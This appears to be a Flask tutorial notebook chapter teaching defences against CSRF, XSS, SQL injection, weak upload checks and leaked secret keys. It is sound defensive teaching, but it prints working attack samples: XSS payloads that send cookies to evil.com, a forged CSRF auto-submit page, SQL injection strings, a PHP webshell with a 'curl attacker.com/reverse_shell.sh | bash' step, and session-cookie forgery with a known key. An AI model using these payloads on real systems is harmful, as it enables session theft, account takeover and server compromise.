<div style='width:100%; display:flex; justify-content:space-between; align-items:center; margin: 1em 0;'>
  <a href='10.%20user_authentication_with_flask_login.ipynb' style='padding:6px 14px; background:#007bff; color:white; border-radius:4px; text-decoration:none; font-weight:bold;'>← Chapter 10: Authentication</a>
  <a href='../TOC.md' style='padding:6px 14px; background:#6c757d; color:white; border-radius:4px; text-decoration:none; font-weight:bold;'>📚 Table of Contents</a>
  <a href='../5.%20building_apis/12.%20building_rest_apis.ipynb' style='padding:6px 14px; background:#28a745; color:white; border-radius:4px; text-decoration:none; font-weight:bold;'>Chapter 12: REST APIs →</a>
</div>

# Chapter 11: Security Best Practices — Keeping the Bad Guys Out

> **Security is not a feature you add at the end — it's a mindset you develop from the beginning.**

In this chapter you will learn to think like an attacker so you can defend like a professional.  
We cover the three threats that hit Flask apps most often — **CSRF, XSS, and SQL injection** — and the
practical tools Flask gives you to stop them cold.

---

## What you'll learn

A first read goes better when you connect every new idea to a concrete responsibility and a concrete use case. Once those anchors are in place, the terminology in this section becomes much easier to reuse accurately.

| Topic | Tool / Technique |
|---|---|
| Cross-Site Request Forgery (CSRF) | Flask-WTF `CSRFProtect` |
| Cross-Site Scripting (XSS) | Jinja2 autoescaping, `markupsafe` |
| SQL Injection | SQLAlchemy ORM, parameterised queries |
| Security headers | Flask-Talisman |
| Input validation | WTForms validators |
| File upload safety | Extension + MIME-type checks |
| Secret management | Environment variables, never in source |

> ❓ **Why use an ORM instead of raw SQL?** An ORM (Object-Relational Mapper) lets you work with database rows as Python objects, so you write Python instead of SQL strings. It also prevents SQL injection by default and makes switching databases straightforward later.

## 11.1  Big Picture — The OWASP Top 10

The [OWASP Top 10](https://owasp.org/www-project-top-ten/) is the industry-standard list of the most
critical web-application security risks.  Three entries are especially relevant to Flask developers:

| Rank | OWASP Category | Flask Exposure | Primary Defence |
|------|---------------|---------------|-----------------|
| A01 | Broken Access Control | Missing `@login_required` | Flask-Login, role checks |
| **A03** | **Injection (SQL)** | Raw `f"SELECT … {user_input}"` | SQLAlchemy ORM / parameterised |
| A05 | Security Misconfiguration | `DEBUG=True` in production, weak `SECRET_KEY` | Config management |
| A06 | Vulnerable Components | Outdated Flask / Jinja2 | `pip audit`, Dependabot |
| **A07** | **Identification & Auth Failures** | Weak session cookies | `SECRET_KEY`, Flask-Login |
| **A03+** | **XSS (stored/reflected)** | `{{ var | safe }}` on user input | Jinja2 autoescaping |
| **CSRF** | **Cross-Site Request Forgery** | Forms without tokens | Flask-WTF `CSRFProtect` |

> **Focus areas in this chapter:** CSRF · XSS · SQL Injection — the three most common Flask attack vectors.

## 11.2  Core Concepts — Plain-English Analogies

The easiest way to read this section is to keep one plain-language question in view: what is Core Concepts — Plain-English Analogies actually responsible for? Once that job is clear, the terminology stops feeling arbitrary and the details start to line up.

### 🎭 CSRF — The Forged Request
Imagine you are logged into your bank.  A malicious tab in the same browser silently submits a
*transfer-money* form **using your session cookie** — the bank thinks it's you.  
**Defence:** embed a secret random token in every form.  The attacker's page cannot read your token,
so its forged form fails validation.

### 💉 XSS — Script Injection

Security topics become much easier to follow when you separate the threat from the defense. As you read, keep asking what can go wrong, what protection addresses it, and what assumption that protection depends on.

A user posts a comment: `<script>document.cookie</script>`.  If the page renders that raw HTML, every
visitor's browser executes the script.  
**Defence:** Jinja2's `{{ variable }}` escapes HTML characters automatically.
`<script>` becomes `&lt;script&gt;` — harmless text.
### 🗃️ SQL Injection — Database Manipulation

If this section feels dense, pause and identify the data structure or model first. Most of the APIs here make more sense once you know what is being stored, queried, or transformed.

A login form accepts username `' OR '1'='1`.  If you interpolate that directly into SQL, the query
becomes `WHERE username='' OR '1'='1'` — which returns **every row in the table**.  
**Defence:** parameterised queries pass user input as *data*, not *SQL syntax*.

> ❓ **What is CSRF?** A Cross-Site Request Forgery attack tricks a logged-in user's browser into sending a request to your site without their knowledge. A CSRF token — a secret value embedded in each form — ensures the submission really came from *your* page.

In [ ]:
# ── Flask-WTF CSRF: minimal setup ──────────────────────────────────────────
# pip install flask-wtf

from flask import Flask
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config["SECRET_KEY"] = "change-me-in-production"   # signs the CSRF token

csrf = CSRFProtect(app)        # ← one line protects every POST/PUT/DELETE/PATCH

# What does {{ form.hidden_tag() }} render?
# It renders something like:
#   <input id="csrf_token" name="csrf_token" type="hidden"
#          value="ImZmYWE0…long-signed-token…">
#
# Flask-WTF generates that token by HMAC-signing:
#   - a random nonce (per session)          → can't be guessed
#   - the current timestamp                 → can't be replayed after expiry
#   - the SECRET_KEY                        → can't be forged without the key

print("CSRF setup: CSRFProtect(app) registered")
print()
print("Template snippet (inside a <form>):")
print('  {{ form.hidden_tag() }}')
print()
print("What the browser receives:")
print('  <input id="csrf_token" name="csrf_token" type="hidden"')
print('         value="ImZmYWE0...HMAC-signed...IjE3MDc...">')


In [ ]:
# ── CSRF attack walkthrough ─────────────────────────────────────────────────

steps = [
    ("1  User logs in",           "Browser receives session cookie: session=eyJ..."),
    ("2  User visits evil.com",   "Attacker's page contains hidden auto-submit form"),
    ("3  Hidden form HTML",       '<form action="https://bank.com/transfer" method="POST">\n'
                                  '      <input name="amount" value="9999">\n'
                                  '      <input name="to"     value="attacker">\n'
                                  '    </form>\n'
                                  '    <script>document.forms[0].submit();</script>'),
    ("4  Browser auto-submits",   "Session cookie is attached automatically — bank sees valid auth"),
    ("5  Without CSRF token",     "Bank processes the transfer — ATTACK SUCCEEDS ✗"),
    ("6  With CSRFProtect",       "Form is missing csrf_token field → 400 Bad Request — ATTACK BLOCKED ✓"),
]

print("=" * 65)
print("  CSRF ATTACK WALKTHROUGH")
print("=" * 65)
for step, detail in steps:
    print(f"\n  {step}")
    for line in detail.split("\n"):
        print(f"      {line}")

print()
print("KEY INSIGHT: The attacker's page is on a different origin.")
print("Browser's same-origin policy prevents evil.com from READING")
print("your csrf_token from bank.com's form — so the forged POST")
print("is missing the token and Flask-WTF rejects it.")


In [ ]:
# ── Flask-WTF: complete CSRF setup ──────────────────────────────────────────
"""
# app/__init__.py
from flask import Flask
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect()

def create_app():
    app = Flask(__name__)
    app.config["SECRET_KEY"] = "use-env-var-in-production"
    app.config["WTF_CSRF_TIME_LIMIT"] = 3600  # token valid for 1 hour (default)
    csrf.init_app(app)
    return app


# templates/base.html  (add meta tag for AJAX)
# <meta name="csrf-token" content="{{ csrf_token() }}">

# static/main.js  (attach token to every AJAX POST)
# fetch('/api/resource', {
#   method: 'POST',
#   headers: {
#     'Content-Type': 'application/json',
#     'X-CSRFToken': document.querySelector('meta[name=csrf-token]').content,
#   },
#   body: JSON.stringify({...}),
# });


# Exempt a view from CSRF (e.g. a webhook endpoint)
# from flask_wtf.csrf import csrf_exempt
#
# @app.route('/webhook', methods=['POST'])
# @csrf_exempt
# def webhook():
#     ...  # validated by webhook secret instead
"""

print("Flask-WTF CSRF complete setup illustrated (no live Flask app needed).")
print()
print("Checklist:")
checklist = [
    "✓  CSRFProtect(app) or csrf.init_app(app) called",
    "✓  SECRET_KEY set from environment variable",
    "✓  {{ form.hidden_tag() }} in every HTML form",
    "✓  X-CSRFToken header on AJAX requests",
    "✓  @csrf_exempt only on webhook/external endpoints",
]
for item in checklist:
    print(f"  {item}")


In [ ]:
# ── XSS attack explanation ──────────────────────────────────────────────────

print("=" * 60)
print("  XSS ATTACK VECTORS")
print("=" * 60)

vectors = {
    "Reflected XSS": {
        "scenario": "Search query echoed back in page",
        "payload":  '?q=<script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
        "effect":   "Victim's cookies sent to attacker",
    },
    "Stored XSS": {
        "scenario": "Malicious comment saved to database, shown to all visitors",
        "payload":  '<img src=x onerror="document.location='https://evil.com/?'+document.cookie">',
        "effect":   "Every page visitor leaks their session",
    },
    "DOM XSS": {
        "scenario": "JavaScript reads URL hash and writes to innerHTML",
        "payload":  '#<img src=1 onerror=alert(1)>',
        "effect":   "No server involvement — pure client-side injection",
    },
}

for name, info in vectors.items():
    print(f"\n  {name}")
    print(f"    Scenario : {info['scenario']}")
    print(f"    Payload  : {info['payload']}")
    print(f"    Effect   : {info['effect']}")

print()
print("ALL of these are stopped when you let Jinja2 escape the output.")
print("The next cell shows exactly how.")


In [ ]:
# ── Jinja2 autoescaping demonstration ───────────────────────────────────────
from markupsafe import escape, Markup

user_inputs = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    'Hello, World!',                        # safe — no escaping needed
    '<b>Bold</b> text',
    "'; DROP TABLE users; --",              # SQL-like, but in HTML context
]

print(f"{'Raw user input':<45}  {'After escape() / {{ var }}'}")
print("-" * 90)
for raw in user_inputs:
    escaped = escape(raw)
    print(f"{raw:<45}  {escaped}")

print()
print("Jinja2 applies escape() automatically to every {{ variable }}.")
print("Characters converted:")
conversions = [("&", "&amp;"), ("<", "&lt;"), (">", "&gt;"),
               ('"', "&#34;"), ("'", "&#39;")]
for char, entity in conversions:
    print(f"  {char!r:>4}  →  {entity}")


In [ ]:
# ── | safe vs autoescaping ──────────────────────────────────────────────────
from markupsafe import escape, Markup

xss_payload = '<script>document.location="https://evil.com/?c="+document.cookie</script>'
trusted_html = "<strong>Sale ends tonight!</strong>"   # written by your team, not users

print("Scenario A: Rendering user-supplied content")
print("-" * 55)
print(f"  {{ comment }}          → {escape(xss_payload)}")
print(f"  {{ comment | safe }}   → {xss_payload}   ← DANGEROUS: raw script tag in page")
print()

print("Scenario B: Rendering trusted HTML from YOUR codebase")
print("-" * 55)
print(f"  {{ banner }}          → {escape(trusted_html)}")
print(f"  {{ banner | safe }}   → {trusted_html}   ← OK: you control this string")
print()

print("RULE OF THUMB:")
print("  | safe  is ONLY acceptable when the string is 100% under your control.")
print("  ANY user-supplied content must go through {{ var }} (no | safe).")
print()

# Demonstrate Markup() — the Python equivalent of | safe
safe_banner = Markup(trusted_html)   # explicitly marked safe in Python code
print(f"  Markup() in Python = same as | safe in template: {safe_banner}")


In [ ]:
# ── Content Security Policy (CSP) ───────────────────────────────────────────
"""
CSP is an HTTP response header that tells the browser which sources are
allowed to load scripts, styles, images, etc.  Even if an attacker injects
a <script> tag, CSP can prevent the browser from executing it.
"""

csp_header_example = """Content-Security-Policy:
  default-src 'self';
  script-src  'self' https://cdn.jsdelivr.net;
  style-src   'self' https://fonts.googleapis.com;
  img-src     'self' data: https:;
  font-src    'self' https://fonts.gstatic.com;
  object-src  'none';
  base-uri    'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;"""

print(csp_header_example)
print()

directives = {
    "default-src 'self'":        "Block everything not from your own origin by default",
    "script-src 'self' cdn.x":  "Allow JS only from self + listed CDNs",
    "object-src 'none'":         "Disable Flash / plugins entirely",
    "frame-ancestors 'none'":    "Prevent your pages being embedded (clickjacking defence)",
    "upgrade-insecure-requests": "Rewrite http:// sub-resource requests to https://",
}
print(f"{'Directive':<35} {'Effect'}")
print("-" * 75)
for directive, effect in directives.items():
    print(f"  {directive:<33} {effect}")

print()
print("Flask-Talisman (next cell) sets CSP for you via Python config.")


In [ ]:
# ── SQL Injection: live demo with sqlite3 ───────────────────────────────────
import sqlite3

# ── build an in-memory database ─────────────────────────────────────────────
conn = sqlite3.connect(":memory:")
conn.execute("""
    CREATE TABLE users (
        id       INTEGER PRIMARY KEY,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        role     TEXT DEFAULT 'user'
    )
""")
conn.executemany("INSERT INTO users VALUES (?, ?, ?, ?)", [
    (1, "alice",   "hashed_pw_1", "admin"),
    (2, "bob",     "hashed_pw_2", "user"),
    (3, "charlie", "hashed_pw_3", "user"),
])
conn.commit()

# ── the attacker's input ─────────────────────────────────────────────────────
malicious_input = "' OR '1'='1"

# ── VULNERABLE: f-string interpolation ──────────────────────────────────────
vulnerable_sql = f"SELECT * FROM users WHERE username = '{malicious_input}'"
print("VULNERABLE QUERY:")
print(f"  {vulnerable_sql}")
print()
rows_vulnerable = conn.execute(vulnerable_sql).fetchall()
print(f"  Rows returned: {len(rows_vulnerable)}  ← returns ALL rows!")
for row in rows_vulnerable:
    print(f"    {row}")

print()

# ── SAFE: parameterised query ────────────────────────────────────────────────
safe_sql = "SELECT * FROM users WHERE username = ?"
print("SAFE (PARAMETERISED) QUERY:")
print(f"  {safe_sql}   params=({malicious_input!r},)")
print()
rows_safe = conn.execute(safe_sql, (malicious_input,)).fetchall()
print(f"  Rows returned: {len(rows_safe)}  ← returns 0 rows (attack neutralised!)")

print()
print("=" * 55)
print("  WHY IT WORKS")
print("=" * 55)
print("  Parameterised queries send the SQL structure and the data")
print("  separately.  The DB driver treats the parameter value as a")
print("  literal string — quotes inside it are NEVER interpreted as")
print("  SQL syntax, so the injection has no effect.")

conn.close()


In [ ]:
# ── SQLAlchemy ORM vs raw SQL ────────────────────────────────────────────────
"""
Using the ORM is the default defence against SQL injection in Flask apps.
SQLAlchemy always uses parameterised queries under the hood.
"""

# ── DANGEROUS: raw f-string (never do this) ──────────────────────────────────
dangerous_examples = [
    ("Login check (f-string)",
     "db.engine.execute(f"SELECT * FROM users WHERE username = '{username}'")"),
    ("Search (format)",
     "db.engine.execute("SELECT * FROM posts WHERE title LIKE '%{}%'".format(q))"),
]

# ── SAFE: ORM equivalents ────────────────────────────────────────────────────
safe_examples = [
    ("Login check (ORM)",
     "User.query.filter_by(username=username).first()"),
    ("Login check (filter)",
     "User.query.filter(User.username == username).first()"),
    ("Search (ilike)",
     "Post.query.filter(Post.title.ilike(f'%{q}%')).all()"),
]

print("DANGEROUS — raw string interpolation:")
print("-" * 60)
for label, code in dangerous_examples:
    print(f"  {label}:")
    print(f"    {code}")
    print()

print("SAFE — SQLAlchemy ORM (parameterised automatically):")
print("-" * 60)
for label, code in safe_examples:
    print(f"  {label}:")
    print(f"    {code}")
    print()

print("The ORM generates SQL like:  WHERE username = ?  and passes")
print("the value separately — identical to the sqlite3 safe demo above.")


In [ ]:
# ── When raw SQL IS needed: SQLAlchemy text() ───────────────────────────────
"""
Sometimes you need hand-crafted SQL (complex CTEs, window functions, etc.).
Use sqlalchemy.text() with bound parameters — NEVER string interpolation.
"""

raw_sql_examples = """
# ── WRONG ────────────────────────────────────────────────────────────────────
results = db.session.execute(
    f"SELECT * FROM orders WHERE status = '{status}' AND user_id = {uid}"
)

# ── CORRECT: text() with named bind parameters ────────────────────────────────
from sqlalchemy import text

results = db.session.execute(
    text("SELECT * FROM orders WHERE status = :status AND user_id = :uid"),
    {"status": status, "uid": uid}
)

# ── CORRECT: complex CTE, still parameterised ─────────────────────────────────
results = db.session.execute(
    text("""
        WITH ranked AS (
            SELECT *, ROW_NUMBER() OVER (PARTITION BY user_id ORDER BY created_at DESC) AS rn
            FROM orders
            WHERE status = :status
        )
        SELECT * FROM ranked WHERE rn = 1 AND user_id = :uid
    """),
    {"status": status, "uid": uid}
)
"""

print("SQLAlchemy text() — safe raw SQL pattern:")
print(raw_sql_examples)
print("Named placeholders (:status, :uid) are NEVER concatenated into the")
print("SQL string — the DB receives them as separate bound parameters.")


In [ ]:
# ── Flask-Talisman: security headers in one line ────────────────────────────
# pip install flask-talisman

talisman_setup = """
from flask import Flask
from flask_talisman import Talisman

app = Flask(__name__)

# ── Minimal (good defaults) ───────────────────────────────────────────────────
talisman = Talisman(app)

# ── Custom CSP ───────────────────────────────────────────────────────────────
csp = {
    "default-src": "'self'",
    "script-src":  ["'self'", "https://cdn.jsdelivr.net"],
    "style-src":   ["'self'", "https://fonts.googleapis.com"],
    "img-src":     ["'self'", "data:", "https:"],
    "object-src":  "'none'",
}

talisman = Talisman(
    app,
    content_security_policy=csp,
    force_https=True,                    # redirect http → https
    strict_transport_security=True,      # HSTS header
    session_cookie_secure=True,          # cookie only over HTTPS
    session_cookie_http_only=True,       # JS cannot read session cookie
    referrer_policy="strict-origin-when-cross-origin",
)
"""

print("Flask-Talisman configuration:")
print(talisman_setup)
print("Headers set by Talisman(app) with defaults:")
headers = [
    ("Strict-Transport-Security",    "max-age=31536000; includeSubDomains"),
    ("X-Content-Type-Options",       "nosniff"),
    ("X-Frame-Options",              "SAMEORIGIN"),
    ("X-XSS-Protection",             "1; mode=block"),
    ("Content-Security-Policy",      "default-src 'self'"),
    ("Referrer-Policy",              "strict-origin-when-cross-origin"),
]
for header, value in headers:
    print(f"  {header:<35} {value}")


In [ ]:
# ── Security headers: what each one does ────────────────────────────────────

headers = {
    "Strict-Transport-Security (HSTS)": {
        "value":  "max-age=31536000; includeSubDomains",
        "why":    "Tells browsers to ONLY connect via HTTPS for the next year.
"
                  "            Prevents SSL-stripping attacks on first visit after initial HTTPS.",
    },
    "X-Content-Type-Options": {
        "value":  "nosniff",
        "why":    "Stops browser MIME-sniffing. Prevents IE/Chrome from treating
"
                  "            a .jpg response as HTML if it starts with '<html>'.",
    },
    "X-Frame-Options": {
        "value":  "SAMEORIGIN  (or DENY)",
        "why":    "Blocks your page being embedded in an iframe on another origin.
"
                  "            Prevents clickjacking (invisible iframe trick).",
    },
    "Content-Security-Policy": {
        "value":  "default-src 'self'; script-src 'self' cdn.x",
        "why":    "Whitelist of allowed sources for scripts/styles/images.
"
                  "            Stops injected scripts from loading external payloads.",
    },
    "Referrer-Policy": {
        "value":  "strict-origin-when-cross-origin",
        "why":    "Controls how much of the URL is sent in the Referer header.
"
                  "            Prevents leaking sensitive URL parameters to third-party sites.",
    },
    "Permissions-Policy": {
        "value":  "geolocation=(), microphone=(), camera=()",
        "why":    "Disables browser APIs your app doesn't need.
"
                  "            Limits damage if XSS occurs — attacker can't access camera.",
    },
}

for name, info in headers.items():
    print(f"  {name}")
    print(f"    Value : {info['value']}")
    print(f"    Why   : {info['why']}")
    print()


In [ ]:
# ── Input validation: why server-side is non-negotiable ─────────────────────

print("=" * 60)
print("  WHY CLIENT-SIDE VALIDATION IS NOT ENOUGH")
print("=" * 60)
print("""
  HTML / JavaScript validation:
    <input type="email" required maxlength="100">

  This is a UX improvement — NOT a security control.

  An attacker can bypass it in 30 seconds:
    1. Open DevTools → remove 'required' attribute → submit
    2. Use curl:
         curl -X POST https://yourapp.com/register \\
              -d "email=not-an-email&password="
    3. Use a script to send raw HTTP requests directly

  Server-side validation (WTForms) runs AFTER the request reaches Flask.
  It cannot be bypassed by client-side tricks.
""")

print("Validation layers and their purposes:")
layers = [
    ("HTML attributes",     "UX: guide users to correct input format"),
    ("JavaScript",          "UX: instant feedback without a round-trip"),
    ("WTForms validators",  "SECURITY: authoritative, server-enforced rules"),
    ("Database constraints","SAFETY NET: last line of defence for data integrity"),
]
for layer, purpose in layers:
    print(f"  {layer:<28} → {purpose}")


In [ ]:
# ── WTForms: server-side validation ─────────────────────────────────────────
"""
WTForms validators run on the server — users cannot bypass them.
"""

wtforms_example = """
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, EmailField
from wtforms.validators import (
    DataRequired, Email, Length, Regexp, EqualTo, ValidationError
)
import re

class RegistrationForm(FlaskForm):
    username = StringField("Username", validators=[
        DataRequired(),
        Length(min=3, max=25),
        Regexp(r"^[A-Za-z0-9_]+$",
               message="Only letters, numbers, underscores allowed"),
    ])
    email    = EmailField("Email", validators=[DataRequired(), Email()])
    password = PasswordField("Password", validators=[
        DataRequired(),
        Length(min=10, message="Password must be at least 10 characters"),
    ])
    confirm  = PasswordField("Confirm Password", validators=[
        EqualTo("password", message="Passwords must match"),
    ])

    # Custom validator — method name MUST be validate_<fieldname>
    def validate_username(self, field):
        if User.query.filter_by(username=field.data).first():
            raise ValidationError("Username already taken.")

    def validate_password(self, field):
        pw = field.data
        if not re.search(r"[A-Z]", pw):
            raise ValidationError("Need at least one uppercase letter.")
        if not re.search(r"[0-9]", pw):
            raise ValidationError("Need at least one digit.")
"""

print(wtforms_example)
print("Validators applied in order — first failure stops the chain.")
print("form.validate_on_submit() runs ALL validators before you touch form.data.")


In [ ]:
# ── File upload security ─────────────────────────────────────────────────────
import mimetypes

ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "webp"}
ALLOWED_MIMETYPES  = {"image/png", "image/jpeg", "image/gif", "image/webp"}

def allowed_extension(filename: str) -> bool:
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS

def allowed_mimetype(file_bytes: bytes) -> bool:
    """Check the magic bytes at the start of the file, not the filename."""
    magic_map = {
        b"\x89PNG":  "image/png",
        b"\xff\xd8\xff": "image/jpeg",
        b"GIF8":     "image/gif",
    }
    for magic, mime in magic_map.items():
        if file_bytes.startswith(magic):
            return mime in ALLOWED_MIMETYPES
    return False  # unknown magic bytes → reject

# ── demonstrate the bypass ───────────────────────────────────────────────────
test_cases = [
    ("profile.jpg",   b"\xff\xd8\xff\xe0" + b"\x00" * 20,  "Legitimate JPEG"),
    ("evil.php",      b"<?php system($_GET['cmd']); ?>",          "PHP webshell — bad extension"),
    ("evil.jpg",      b"<?php system($_GET['cmd']); ?>",          "PHP webshell — renamed to .jpg"),
    ("real.png",      b"\x89PNG\r\n\x1a\n" + b"\x00" * 20, "Legitimate PNG"),
]

print(f"  {'Filename':<18} {'Extension OK':<15} {'MIME OK':<12} {'Verdict'}")
print("  " + "-" * 65)
for filename, content, desc in test_cases:
    ext_ok  = allowed_extension(filename)
    mime_ok = allowed_mimetype(content)
    safe    = ext_ok and mime_ok
    verdict = "✓ ALLOW" if safe else "✗ BLOCK"
    print(f"  {filename:<18} {str(ext_ok):<15} {str(mime_ok):<12} {verdict}  ({desc})")

print()
print("INSIGHT: evil.jpg passes the extension check but fails the MIME check.")
print("Always validate BOTH extension AND magic bytes for file uploads.")


In [ ]:
# ── Comparison: | safe on user input vs proper escaping ────────────────────
from markupsafe import escape

payloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=fetch("//evil.com?c="+document.cookie)>',
    '<svg onload=alert(document.domain)>',
    'Normal comment with <b>bold</b> text',
    "Robert'); DROP TABLE students; --",    # Bobby Tables
]

print(f"  {'User input (truncated)':<50}  {'| safe (DANGEROUS)':<28}  After escape()")
print("  " + "-" * 110)
for raw in payloads:
    display_raw = raw[:48] + ".." if len(raw) > 50 else raw
    safe_output   = raw          # | safe → rendered as-is (DANGEROUS)
    escaped_output = str(escape(raw))
    print(f"  {display_raw:<50}  {'RENDERS RAW HTML':<28}  {escaped_output[:60]}")

print()
print("Bottom line:")
print("  {{ user_comment }}         → safe (escaped automatically by Jinja2)")
print("  {{ user_comment | safe }}  → DANGEROUS (attacker controls browser DOM)")


In [ ]:
# ── Comparison: string SQL vs parameterised — full sqlite3 demo ─────────────
import sqlite3

conn = sqlite3.connect(":memory:")
conn.execute("CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price REAL)")
conn.executemany("INSERT INTO products VALUES (?,?,?)", [
    (1, "Widget",  9.99),
    (2, "Gadget", 29.99),
    (3, "Doohickey", 4.99),
])
conn.commit()

attacks = [
    ("Normal search",         "Widget"),
    ("UNION injection",       "' UNION SELECT id, username, 0 FROM sqlite_master --"),
    ("Always-true injection", "' OR '1'='1"),
    ("Comment injection",     "Widget' --"),
]

print("=" * 70)
print("  STRING INTERPOLATION  vs  PARAMETERISED QUERIES")
print("=" * 70)

for label, user_input in attacks:
    vuln_sql = f"SELECT * FROM products WHERE name = '{user_input}'"
    safe_sql  = "SELECT * FROM products WHERE name = ?"

    try:
        vuln_rows = conn.execute(vuln_sql).fetchall()
    except Exception as e:
        vuln_rows = [f"ERROR: {e}"]

    safe_rows  = conn.execute(safe_sql, (user_input,)).fetchall()

    print(f"\n  Attack: {label}")
    print(f"  Input : {user_input!r}")
    print(f"  Vuln  ({len(vuln_rows)} rows) : {vuln_rows}")
    print(f"  Safe  ({len(safe_rows)} rows) : {safe_rows}")

conn.close()


In [ ]:
# ── What If #1: CSRF disabled on a state-changing form ──────────────────────

print("SCENARIO: Developer exempts a login form from CSRF to 'simplify testing'")
print()

attack_html = """<!-- evil.com/attack.html -->
<html>
<body>
  <form id="f" action="https://yourapp.com/change-email" method="POST">
    <input name="email" value="attacker@evil.com">
  </form>
  <script>
    // Auto-submit the moment victim visits evil.com
    document.getElementById('f').submit();
  </script>
</body>
</html>"""

print("Attacker's page:")
print(attack_html)
print()
print("Attack flow:")
steps = [
    "1. Victim is logged into yourapp.com (session cookie active)",
    "2. Victim visits evil.com (phishing email, malicious ad, etc.)",
    "3. evil.com auto-submits the form — browser attaches session cookie",
    "4. yourapp.com receives a valid authenticated POST",
    "5. Without CSRF token check → email changed to attacker@evil.com",
    "6. Attacker requests password reset → receives it at attacker@evil.com",
    "7. Account fully compromised",
]
for step in steps:
    print(f"  {step}")

print()
print("FIX: Remove @csrf_exempt from all state-changing views.")
print("     Never exempt login, register, change-email, change-password, delete.")


In [ ]:
# ── What If #2: File extension-only check — the bypass ──────────────────────

print("SCENARIO: Server only checks file extension, not actual file content")
print()

bypass_technique = """
# ATTACKER WORKFLOW:
# 1. Create a PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > webshell.php

# 2. Rename it to pass the extension check
mv webshell.php webshell.jpg

# 3. Upload webshell.jpg — extension check passes! ✓

# 4. If server stores and serves files without re-validating:
#    GET /uploads/webshell.jpg?cmd=whoami
#    GET /uploads/webshell.jpg?cmd=cat+/etc/passwd
#    GET /uploads/webshell.jpg?cmd=curl+attacker.com/reverse_shell.sh+|+bash
"""
print(bypass_technique)

print("What the file looks like:")
print("  Filename extension : .jpg        → extension check PASSES ✓")
print("  First 4 bytes      : '<?ph'      → magic bytes check FAILS ✗")
print("  Real content       : PHP code    → should be JPEG image data")
print()
print("Defence (from the file upload cell above):")
defences = [
    "Check magic bytes (first 4-8 bytes) against known image signatures",
    "Use python-magic or Pillow to fully decode and re-encode the image",
    "Store uploads OUTSIDE the web root so they are never executed",
    "Set Content-Disposition: attachment to prevent inline rendering",
    "Rename files with a UUID before saving — strip original filename",
]
for i, d in enumerate(defences, 1):
    print(f"  {i}. {d}")


In [ ]:
# ── What If #3: SECRET_KEY committed to public GitHub ───────────────────────

print("SCENARIO: Developer commits SECRET_KEY = 'mysecretkey' to GitHub")
print()

print("What SECRET_KEY signs:")
signed_things = [
    ("Session cookies",       "Flask serialises session dict → signs with SECRET_KEY → sends as cookie"),
    ("CSRF tokens",           "Flask-WTF HMAC-signs nonce with SECRET_KEY"),
    ("Password reset tokens", "itsdangerous TimedSerializer uses SECRET_KEY"),
    ("Email confirm tokens",  "itsdangerous URLSafeSerializer uses SECRET_KEY"),
]
for thing, detail in signed_things:
    print(f"  {thing:<28} : {detail}")

print()
print("The attack (session cookie forgery):")
forgery_steps = """
  # The attacker finds SECRET_KEY = 'mysecretkey' on GitHub

  # Flask session cookies look like:
  #   eyJyb2xlIjoiY...(base64)....<signature>

  # With the known key, attacker forges a cookie:
  from itsdangerous import URLSafeTimedSerializer
  s = URLSafeTimedSerializer('mysecretkey')
  forged_cookie = s.dumps({'user_id': 1, 'role': 'admin', '_fresh': True})
  # → sets this as their session cookie → they are now admin

  # No password needed. No brute force. Pure cryptographic bypass.
"""
print(forgery_steps)

print("FIX:")
fixes = [
    "SECRET_KEY = os.environ['SECRET_KEY']   # read from env, never hardcode",
    "Use 32+ random bytes: python -c "import secrets; print(secrets.token_hex(32))"",
    "Add .env to .gitignore BEFORE your first commit",
    "If already leaked: rotate immediately, invalidate all sessions",
    "Use GitHub secret scanning alerts to catch accidental leaks",
]
for fix in fixes:
    print(f"  ✓ {fix}")


In [ ]:
# ── Security checklist ──────────────────────────────────────────────────────

checklist = {
    "CSRF Protection": [
        "CSRFProtect(app) or csrf.init_app(app) installed",
        "{{ form.hidden_tag() }} in every HTML form",
        "X-CSRFToken header on AJAX POST/PUT/DELETE",
        "@csrf_exempt only on webhook endpoints (validated by secret)",
    ],
    "XSS Prevention": [
        "Never use {{ variable | safe }} on user-supplied content",
        "Use {{ variable }} (autoescaping) for all user data",
        "Content-Security-Policy header set (Flask-Talisman)",
        "sanitise rich-text HTML with bleach if you must accept it",
    ],
    "SQL Injection": [
        "Use SQLAlchemy ORM — never string-interpolate into SQL",
        "Raw SQL only via text() with named bound parameters",
        "DB user has minimum privileges (no DROP, no CREATE)",
        "Regular db.session.rollback() on exception",
    ],
    "Authentication & Sessions": [
        "SECRET_KEY from environment variable (never hardcoded)",
        "SECRET_KEY is 32+ random bytes",
        "SESSION_COOKIE_SECURE = True (HTTPS only)",
        "SESSION_COOKIE_HTTPONLY = True (no JS access)",
        "PERMANENT_SESSION_LIFETIME set (session expiry)",
    ],
    "File Uploads": [
        "Whitelist extensions AND check magic bytes",
        "Store uploads outside web root",
        "Rename files to UUID before saving",
        "Limit file size (MAX_CONTENT_LENGTH)",
    ],
    "Dependencies & Config": [
        "DEBUG = False in production",
        "pip audit or Safety scan in CI/CD",
        "Dependabot or Renovate for automatic updates",
        ".env in .gitignore — never commit secrets",
    ],
    "Security Headers (Flask-Talisman)": [
        "Strict-Transport-Security (HSTS)",
        "X-Content-Type-Options: nosniff",
        "X-Frame-Options: SAMEORIGIN",
        "Content-Security-Policy configured",
    ],
}

print("=" * 60)
print("  FLASK SECURITY CHECKLIST")
print("=" * 60)
for category, items in checklist.items():
    print(f"\n  [{category}]")
    for item in items:
        print(f"    ☐  {item}")
print()
print(f"  Total items: {sum(len(v) for v in checklist.values())}")


## 11.10  Real-World Reference Project

The companion repository applies every technique in this chapter to a production-ready Flask app:

| Feature | File | Key Lines |
|---|---|---|
| CSRFProtect | `app/__init__.py` | `csrf = CSRFProtect(app)` |
| Form with CSRF | `templates/auth/register.html` | `{{ form.hidden_tag() }}` |
| SQLAlchemy ORM | `app/models/user.py` | `User.query.filter_by(...)` |
| Flask-Talisman | `app/__init__.py` | `Talisman(app, csp=csp)` |
